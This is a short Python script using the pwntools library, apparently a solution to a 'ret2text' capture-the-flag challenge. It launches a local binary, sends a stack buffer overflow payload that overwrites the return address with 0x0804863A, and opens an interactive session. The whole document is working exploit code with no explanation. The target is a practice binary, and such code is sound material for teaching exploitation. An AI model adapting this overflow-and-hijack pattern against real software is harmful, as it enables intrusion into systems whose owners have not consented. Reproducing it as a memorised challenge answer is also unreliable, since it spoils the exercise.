from pwn import *
sh = process("./ret2text")
offset = 0x6c
add = 0x0804863A
payload = b"a"*offset + b"b"*0x4 + p32(add)
sh.sendline(payload)
sh.interactive()
